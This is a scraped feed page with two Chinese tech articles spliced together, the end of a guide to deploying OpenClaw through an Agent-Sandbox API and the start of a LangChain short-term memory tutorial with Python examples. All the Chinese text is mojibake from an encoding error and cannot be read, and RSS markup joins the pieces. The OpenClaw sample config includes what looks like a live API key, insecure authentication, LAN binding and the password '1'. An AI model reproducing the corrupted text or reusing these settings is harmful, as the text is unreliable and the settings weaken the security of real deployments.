<p>åœ¨ Agent-Sandbox ä¸­ï¼Œæ‰€æœ‰æ²™ç®±çš„åˆ›å»ºéƒ½é€šè¿‡åŒä¸€ä¸ª RESTful APIï¼š<code>POST /api/v1/sandbox</code>ã€‚</p>
<p>å½“ä½ å®‰è£…å¥½ Agent-Sandboxï¼Œåªéœ€è¦ä¸€è¡Œ <code>curl</code> å°±èƒ½åœ¨é›†ç¾¤ä¸­æ‹‰èµ·ä¸€ä¸ª OpenClaw å®ä¾‹ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">curl --location 'http://agent-sandbox.your-host.com/api/v1/sandbox' \
  --header 'Content-Type: application/json' \
  --data '{"name":"openclaw1","template":"openclaw"}'
</code></pre>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Sandbox openclaw-alice created successfully"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è¿™ä¸€æ­¥ï¼Œå°±å·²ç»åœ¨ä½ çš„ Kubernetes é›†ç¾¤é‡Œä¸ºæŸä½åŒäº‹æ‹‰èµ·äº†ä¸€ä¸ªå®Œæ•´å¯ç”¨çš„ OpenClaw å®ä¾‹ã€‚</p>
<h2 data-id="heading-2">ä»–çš„è®¿é—®åœ°å€ä¼šæ˜¯ï¼š</h2>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A10000%2Fsandbox%2Fopenclaw1" target="_blank" title="http://localhost:10000/sandbox/openclaw1" ref="nofollow noopener noreferrer">http://localhost:10000/sandbox/openclaw1</a></p>
<h2 data-id="heading-3">äºŒã€OpenClaw é…ç½®</h2>
<p>é»˜è®¤é…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"models"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"providers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"custom-1"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://xxx.com/v1"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"apiKey"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fe87c9e9-f399-49ca-98da-2f2404a249c2"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"auth"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"api-key"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"api"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"openai-completions"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"models"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"agents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"defaults"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"primary"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"custom-1/glm-4.7"</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"workspace"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/root/.openclaw/workspace"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"maxConcurrent"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"subagents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"maxConcurrent"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">8</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"gateway"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"port"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">18789</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"mode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"local"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"bind"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"lan"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"controlUi"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"allowInsecureAuth"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>æ¨¡æ¿ä¸­çš„ <code>openclaw.json</code> ç»™å‡ºäº†ä¸€ä¸ªé»˜è®¤é…ç½®ç¤ºä¾‹ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>æ¨¡å‹é…ç½®</strong>ï¼šç¤ºä¾‹ä¸­ä½¿ç”¨äº†åä¸º <code>custom-1/glm-4.7</code> çš„æ¨¡å‹ï¼Œä½ å¯ä»¥æ ¹æ®å…¬å¸å†…éƒ¨æ¨¡å‹ç½‘å…³è¿›è¡Œè°ƒæ•´ã€‚</li>
<li><strong>ç½‘å…³å‚æ•°</strong>ï¼š
<ul>
<li>ç«¯å£ï¼š<code>18789</code></li>
<li>ç»‘å®šæ¨¡å¼ï¼š<code>lan</code></li>
<li>è®¤è¯æ–¹å¼ï¼šå¯†ç ç™»å½•ï¼ˆç¤ºä¾‹å¯†ç ä¸º <code>1</code>ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<p>ä¹‹åè®¿é—® <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A10000%2Fsandbox%2Fopenclaw1" target="_blank" title="http://localhost:10000/sandbox/openclaw1" ref="nofollow noopener noreferrer">http://localhost:10000/sandbox/openclaw1</a> å³å¯è¿›å…¥ OpenClaw ç•Œé¢ï¼Œä¿®æ”¹å¤§æ¨¡å‹å‚æ•°ï¼Œ</p>
<h3 data-id="heading-4">1ï¼Œä¿®æ”¹å¤§æ¨¡å‹Provider</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2c5277b04954ceca79d3b3a34a1705c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770378903&amp;x-signature=3EmLeXSYNRgO7b7H1XF6cUnZduc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">2ï¼Œä¿®æ”¹Agenté»˜è®¤å¤§æ¨¡å‹åç§°</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0652df1b46ce49cc853cf6a3de7b018c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770378903&amp;x-signature=oNJN2Uz6vzLf5PXZx%2BTthM8GoDY%3D" alt="" loading="lazy"/></p>
<p>æ ¹æ®éœ€è¦è°ƒæ•´æ¨¡å‹å’Œç½‘å…³é…ç½®ï¼Œå³å¯å¼€å§‹ä½¿ç”¨ OpenClaw äº†ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChain V1.0 æ ¸å¿ƒè§£æï¼ˆå››ï¼‰ï¼šShort-term memoryç»„ä»¶â€”â€”è®©AIè®°ä½å¯¹è¯ï¼šä¸Šä¸‹æ–‡ç®¡ç†ä¸å†å²è¿½æº¯æŠ€æœ¯]]></title>    <link>https://juejin.cn/post/7600994087587610643</link>    <guid>https://juejin.cn/post/7600994087587610643</guid>    <pubDate>2026-01-30T13:54:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600994087587610643" data-draft-id="7600964907489443846" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChain V1.0 æ ¸å¿ƒè§£æï¼ˆå››ï¼‰ï¼šShort-term memoryç»„ä»¶â€”â€”è®©AIè®°ä½å¯¹è¯ï¼šä¸Šä¸‹æ–‡ç®¡ç†ä¸å†å²è¿½æº¯æŠ€æœ¯"/> <meta itemprop="keywords" content="åç«¯,ç®—æ³•,LLM"/> <meta itemprop="datePublished" content="2026-01-30T13:54:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="16_one"/> <meta itemprop="url" content="https://juejin.cn/user/2802034986197256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChain V1.0 æ ¸å¿ƒè§£æï¼ˆå››ï¼‰ï¼šShort-term memoryç»„ä»¶â€”â€”è®©AIè®°ä½å¯¹è¯ï¼šä¸Šä¸‹æ–‡ç®¡ç†ä¸å†å²è¿½æº¯æŠ€æœ¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2802034986197256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    16_one
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:54:08.000Z" title="Fri Jan 30 2026 13:54:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»16åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Agent è®°å¿†ç®¡ç†</h2>
<p><strong>æ¦‚è¿°</strong></p>
<blockquote>
<p>çŸ­æœŸè®°å¿†è®©ä½ çš„åº”ç”¨ç¨‹åºèƒ½å¤Ÿè®°ä½å•ä¸ªçº¿ç¨‹æˆ–å¯¹è¯ä¸­çš„å…ˆå‰äº¤äº’ã€‚</p>
</blockquote>
<p><strong>æ ¸å¿ƒè¦ç´ </strong></p>
<ul>
<li><strong>State (çŠ¶æ€)</strong>: å®šä¹‰ç”¨æ¥å­˜å‚¨æ¶ˆæ¯çš„ç»“æ„ï¼ˆé€šå¸¸æ˜¯ <code>MessagesState</code>ï¼‰</li>
<li><strong>Checkpointer (æ£€æŸ¥ç‚¹ä¿å­˜å™¨)</strong>: è´Ÿè´£åœ¨æ¯ä¸€æ­¥ç»“æŸåæŠŠçŠ¶æ€ä¿å­˜ä¸‹æ¥ï¼ˆçŸ­æœŸè®°å¿†é€šå¸¸ç”¨ <code>MemorySaver</code>ï¼‰</li>
<li><strong>Thread ID (çº¿ç¨‹ID)</strong>: åœ¨è°ƒç”¨æ—¶é€šè¿‡ <code>config</code> ä¼ å…¥ï¼Œç”¨æ¥éš”ç¦»ä¸åŒç”¨æˆ·çš„å¯¹è¯ä¸Šä¸‹æ–‡</li>
</ul>
<p><strong>é”™è¯¯è®¤çŸ¥</strong></p>
<ul>
<li>å†…å­˜ = çŸ­æœŸè®°å¿†</li>
<li>æ•°æ®åº“ = é•¿æœŸè®°å¿†</li>
</ul>
<p><strong>æ­£ç¡®æ ‡å‡†</strong></p>
<ul>
<li>çŸ­æœŸè®°å¿†ï¼šæ•°æ®ä¸ä¼šè¯ï¼ˆthreadè¿›ç¨‹ï¼‰ç”Ÿå‘½å‘¨ç»‘å®šï¼Œéšä¼šè¯ç»“æŸè€Œè¢«æ¸…ç†æˆ–é—å¿˜</li>
<li>é•¿æœŸè®°å¿†ï¼šæ•°æ®ä¸ç”¨æˆ·/ä¸šåŠ¡å®ä½“ç”Ÿå‘½å‘¨æœŸç»‘å®šï¼Œè·¨ä¼šè¯æŒä¹…ä¿ç•™å¹¶å¯ä¸»åŠ¨æ£€ç´¢</li>
</ul>
<h3 data-id="heading-1">çŸ­æœŸè®°å¿†</h3>
<blockquote>
<p>çŸ­æœŸè®°å¿†é€šè¿‡LangGrapçš„AgentState(ä¸€ä¸ªTypedDict)æ¥ç®¡ç†ã€‚å¯¹è¯å†å²ã€ä¸­é—´æ­¥éª¤ç­‰ä¿¡æ¯è¢«ä¿å­˜åœ¨çŠ¶æ€ä¸­ï¼Œå¹¶é€šè¿‡æ£€æŸ¥ç‚¹ï¼ˆCheckpointsï¼‰æœºåˆ¶åœ¨æ¯æ¬¡è¿­ä»£åæŒä¹…åŒ–ã€‚è¿™ä½¿å¾—é•¿å¯¹è¯å’Œå¤±è´¥æ¢å¤æˆä¸ºå¯èƒ½ã€‚</p>
</blockquote>
<p>Checkpointeræœºåˆ¶</p>
<blockquote>
<p>è¿™æ˜¯LangGrapè®°å¿†çš„çµé­‚</p>
</blockquote>
<ul>
<li><strong>ä¸åŠ è¿™ä¸€è¡Œ</strong>ï¼šAgentæ˜¯æ— çŠ¶æ€çš„ã€‚æ¯æ¬¡<code>invoke</code>éƒ½æ˜¯å…¨æ–°çš„å¼€å§‹</li>
<li><strong>åŠ ä¸Šä¸€è¡Œ</strong>ï¼šLangGraphä¼šåœ¨æ¯ä¸€æ­¥æ‰§è¡Œåï¼ŒæŠŠ<code>state</code>åºåˆ—åŒ–å¹¶å­˜å…¥<code>MemorySaver</code></li>
<li><strong>åŸç†</strong>ï¼šå½“ä½ å†æ¬¡invokeå¹¶ä¼ å…¥<code>thread_id</code>æ—¶ï¼ŒLangGraphä¼šå…ˆå»å†…å­˜é‡ŒæŸ¥è¿™ä¸ª IDä¸Šæ¬¡åœåœ¨å“ªé‡Œï¼ŸçŠ¶æ€æ˜¯ä»€ä¹ˆï¼Ÿç„¶ååŠ è½½è½¬æ”¹ï¼ŒæŠŠæ¶ˆæ¯<code>append</code>è¿›å»ï¼Œåœ¨ç»§ç»­è¿è¡Œ</li>
</ul>
<h3 data-id="heading-2">InMemorySaver()å†…å­˜è®°å¿†ç®¡ç†</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> create_agent
<span class="hljs-keyword">from</span> langchain_core.tools <span class="hljs-keyword">import</span> tool
<span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> InMemorySaver
<span class="hljs-keyword">from</span> langchain_core.messages <span class="hljs-keyword">import</span> HumanMessage, SystemMessage, trim_messages

<span class="hljs-comment"># ============ åˆå§‹åŒ– LLM ============</span>
model = load_chat_model(model=<span class="hljs-string">"gpt-4o-mini"</span>,provider=<span class="hljs-string">"openai"</span>)

<span class="hljs-comment"># ============ å®šä¹‰å·¥å…·å‡½æ•° ============</span>
<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_info</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼Œè¿”å›å§“åã€å¹´é¾„ã€çˆ±å¥½"""</span>
    user_db = {
        <span class="hljs-string">"é™ˆæ˜"</span>: {<span class="hljs-string">"age"</span>: <span class="hljs-number">28</span>, <span class="hljs-string">"hobby"</span>: <span class="hljs-string">"æ—…æ¸¸ã€æ»‘é›ªã€å–èŒ¶"</span>},
        <span class="hljs-string">"å¼ ä¸‰"</span>: {<span class="hljs-string">"age"</span>: <span class="hljs-number">32</span>, <span class="hljs-string">"hobby"</span>: <span class="hljs-string">"ç¼–ç¨‹ã€é˜…è¯»ã€ç”µå½±"</span>}
    }
    info = user_db.get(name, {<span class="hljs-string">"age"</span>: <span class="hljs-string">"æœªçŸ¥"</span>, <span class="hljs-string">"hobby"</span>: <span class="hljs-string">"æœªçŸ¥"</span>})
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"å§“å: <span class="hljs-subst">{name}</span>, å¹´é¾„: <span class="hljs-subst">{info[<span class="hljs-string">'age'</span>]}</span>å², çˆ±å¥½: <span class="hljs-subst">{info[<span class="hljs-string">'hobby'</span>]}</span>"</span>

<span class="hljs-comment"># ============ 1. åŸºç¡€çŸ­æœŸè®°å¿†ï¼šInMemorySaver ============</span>
<span class="hljs-string">"""
å¼€å‘ç¯å¢ƒä½¿ç”¨å†…å­˜å­˜å‚¨ï¼Œé‡å¯åè®°å¿†ä¸¢å¤±ã€‚
å…³é”®å‚æ•°ï¼š
- checkpointer: è®°å¿†å­˜å‚¨å¯¹è±¡
- thread_id: ä¼šè¯å”¯ä¸€æ ‡è¯†ï¼ˆç”¨æˆ·çº§éš”ç¦»ï¼‰
"""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">demo_inmemory_memory</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"åœºæ™¯ 1: å†…å­˜è®°å¿†ï¼ˆå¼€å‘ç¯å¢ƒï¼‰"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)

    <span class="hljs-comment"># åˆ›å»ºå†…å­˜æ£€æŸ¥ç‚¹</span>
    memory = InMemorySaver()

    <span class="hljs-comment"># åˆ›å»º Agentï¼ˆè‡ªåŠ¨ç»§æ‰¿å¯¹è¯è®°å¿†èƒ½åŠ›ï¼‰</span>
    agent = create_agent(
        model=model,
        tools=[get_user_info],
        checkpointer=memory  <span class="hljs-comment"># å¯ç”¨çŸ­æœŸè®°å¿†</span>
    )

    <span class="hljs-comment"># é…ç½®ï¼šthread_id ä½œä¸ºä¼šè¯ ID</span>
    config = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: <span class="hljs-string">"user_123"</span>}}

    <span class="hljs-comment"># ç¬¬ä¸€è½®å¯¹è¯ï¼šè‡ªæˆ‘ä»‹ç»</span>
    response1 = agent.invoke(
        {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä½ å¥½ï¼Œæˆ‘å«é™ˆæ˜ï¼Œå¥½ä¹…ä¸è§ï¼"</span>}]},
        config=config
    )
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç”¨æˆ·ï¼šä½ å¥½ï¼Œæˆ‘å«é™ˆæ˜ï¼Œå¥½ä¹…ä¸è§ï¼"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"AI: <span class="hljs-subst">{response1[<span class="hljs-string">'messages'</span>][-<span class="hljs-number">1</span>].content}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">40</span>)

    <span class="hljs-comment"># ç¬¬äºŒè½®å¯¹è¯ï¼šæµ‹è¯•è®°å¿†</span>
    response2 = agent.invoke(
        {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"è¯·é—®ä½ è¿˜è®°å¾—æˆ‘å«ä»€ä¹ˆåå­—å—ï¼Ÿ"</span>}]},
        config=config  <span class="hljs-comment"># ä½¿ç”¨ç›¸åŒ thread_idï¼Œè‡ªåŠ¨æºå¸¦ä¸Šä¸‹æ–‡</span>
    )
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç”¨æˆ·ï¼šè¯·é—®ä½ è¿˜è®°å¾—æˆ‘å«ä»€ä¹ˆåå­—å—ï¼Ÿ"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"AI: <span class="hljs-subst">{response2[<span class="hljs-string">'messages'</span>][-<span class="hljs-number">1</span>].content}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">40</span>)

    <span class="hljs-comment"># éªŒè¯è®°å¿†çŠ¶æ€</span>
    state = agent.get_state(config)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å½“å‰è®°å¿†è½®æ¬¡: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(state.values[<span class="hljs-string">'messages'</span>])}</span> æ¡æ¶ˆæ¯"</span>)

    <span class="hljs-comment"># æ–°å¼€ä¸€ä¸ªä¼šè¯ï¼ˆä¸åŒ thread_idï¼‰</span>
    config2 = {<span class="hljs-string">"configurable"</span>: {<span class="hljs-string">"thread_id"</span>: <span class="hljs-string">"user_456"</span>}}
    response3 = agent.invoke(
        {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"æˆ‘ä»¬ä¹‹å‰èŠè¿‡å—ï¼Ÿ"</span>}]},
        config=config2
    )
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ–°ä¼šè¯ AI: <span class="hljs-subst">{response3[<span class="hljs-string">'messages'</span>][-<span class="hljs-number">1</span>].content}</span>"</span>)  <span class="hljs-comment"># åº”æ— è®°å¿†</span>

demo_inmemory_memory()
</code></pre>
<h3 data-id="heading-3">PostgresSaver()æ•°æ®åº“æŒä¹…åŒ–è®°å¿†</h3>
<blockquote>
<p>PostgresSaver å³ä½¿å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œä»ç„¶å±äºçŸ­æœŸè®°å¿†ã€‚ä»ç„¶å±äºçŸ­æœŸè®°å¿†çš„åŸå› </p>
</blockquote>
<ul>
<li>ä½œç”¨åŸŸé™åˆ¶ï¼šå®ƒåªæ£€ç´¢å’ŒåŠ è½½å½“å‰ thread_id çš„æ•°æ®</li>
<li>ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼šé»˜è®¤ä¸ä¼šä¸»åŠ¨æ¸…ç†ï¼Œä½†æ•°æ®è¯­ä¹‰ä¸Šå±äº"æœ¬æ¬¡ä¼šè¯"</li>
<li>æ— è·¨ä¼šè¯æ£€ç´¢èƒ½åŠ›ï¼šæ— æ³•åœ¨æ–°ä¼šè¯ä¸­è‡ªåŠ¨è®¿é—®æ—§ä¼šè¯æ•°æ®ï¼ˆé™¤éæ‰‹åŠ¨æŒ‡å®šæ—§ thread_idï¼‰</li>
</ul>
<blockquote>
<p>pip install langgraph-checkpoint-postgres</p>
</blockquote>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.checkpoint.postgres <span class="hljs-keyword">import</span> PostgresSaver

<span class="hljs-string">"""
ç”Ÿäº§ç¯å¢ƒä½¿ç”¨æ•°æ®åº“å­˜å‚¨ï¼Œæ”¯æŒï¼š
- æŒä¹…åŒ–ï¼ˆé‡å¯ä¸ä¸¢å¤±ï¼‰
- å¤šå®ä¾‹å…±äº«ï¼ˆåˆ†å¸ƒå¼éƒ¨ç½²ï¼‰
- å¤§è§„æ¨¡å¹¶å‘
"""</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"åœºæ™¯ 2: Postgres æŒä¹…åŒ–è®°å¿†ï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)

